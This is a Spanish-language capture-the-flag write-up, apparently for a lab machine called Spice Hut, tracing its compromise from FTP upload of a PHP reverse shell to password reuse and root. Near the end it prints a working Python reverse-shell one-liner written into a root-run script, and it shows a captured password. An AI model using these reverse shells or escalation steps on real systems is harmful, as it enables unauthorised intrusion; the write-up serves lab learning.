# Descripción

Somos Spice Hut, una nueva empresa emergente que acaba de triunfar. Nosotros
ofrecemos una variedad de especias y sándwiches club (por si te entra hambre),
pero no es por eso por lo que estás aquí. A decir verdad, no estamos seguros de si nuestros
desarrolladores saben lo que están haciendo y nuestras preocupaciones de seguridad están 
en aumento. Le pedimos que realice una prueba de penetración a fondo y tratar de 
poseer la raíz. Buena suerte.

# Reconocimiento

`nmap --min-rate 4000 -p- --open -sCV -v 10.10.115.93 -oN tcp_scan.txt`

 ![[Pasted image 20240412072219.png]]
 
Podemos ver el servicio FTP, con el usuario Anonymous habilitado con permisos de escritura dentro de la carpeta ftp, el servicio ssh, y un servidor apache corriendo en el puerto 80

Intentaremos ver que hay dentro del servidor ftp, y encontramos 2 archivos, y una carpeta llamada ftp, descargaremos los archivos notice.txt, y important.jpg para ver su contenido.

![[Pasted image 20240412082644.png]]
![[Pasted image 20240412082725.png]]

Pensando que esta corriendo un servidor web, podríamos ver si estos subdirectorios existen a nivel web, y si fuera el caso podríamos subir una reverse shell, mediante la carpeta ftp, he intentado directamente sobre la raíz y no he podido así que he hecho fuzzing, y obtuve la carpeta files donde se almacena lo que tiene el servidor ftp

![[Pasted image 20240412073926.png]]

![[Pasted image 20240412073942.png]]

Podemos ver que es el mismo archivo que descargamos en nuestra maquina dentro del ftp.

# Acceso inicial

Crearemos una revshell en php, en mi caso he usado revshells[].com, pero cualquier rev php, funcionaria, le damos permisos, y lo subimos al ftp, para ver si poniendolos a la escucha y ejecutando el archivo logramos una shell inversa 

![[Pasted image 20240412074604.png]]
![[Pasted image 20240412074623.png]]

Podemos listar dentro de la raiz /files/ftp/revshell.php nuestra shell inversa, poniendo netcat a la escucha, y efectivamente conseguimos una shell para el usuario www-data 

![[Pasted image 20240412074903.png]]

Podemos enumerar un usuario llamado lennie, listemos los permisos SUID que tiene el usuario www-data, para poder escalar privilegios, intentamos ver, pero no encontramos nada en las conexiones a la escucha o archivos en los que tengamos permisos
![[Pasted image 20240412083227.png]]
Dentro de la carpeta raiz encontramos una carpeta llamada incidentes con las contraseñas captadas de una comuncicación de ncap

![[1_VdH_oe1-qVobhaIbvnIQbQ.webp]]

usuario: www-data
contraseña: c4ntg3t3n0ughsp1c3

Sin poder escalar privilegios verificaremos si se ha reutilizar contraseñas, he intentado fuerza bruta cntra lennie pero no he podido, pero utilizando la contraseña c4ntg3t3n0ughsp1c3, tenemos acceso a lennie

![[Pasted image 20240412083730.png]]
![[Pasted image 20240412084053.png]]

# Escalada de privilegios

Dentro de la carpeta de la primera bandera, podemos encontrar dos carpetas, documents y scripts, dentro de scripts podemos ver un script en bash, que fue creado por el root, y tenemos  ejecución en la ruta /etc/print.sh

![[Pasted image 20240412084338.png]]

cat > /etc/print.sh << EOF 
#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.255.131",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
EOF
![[Pasted image 20240412085714.png]]
![[Pasted image 20240412085733.png]]

rescribimos el script con un revshell en python apuntando a nuestro puerto 4443 y tenemos el usuario root

![[Pasted image 20240412085830.png]]
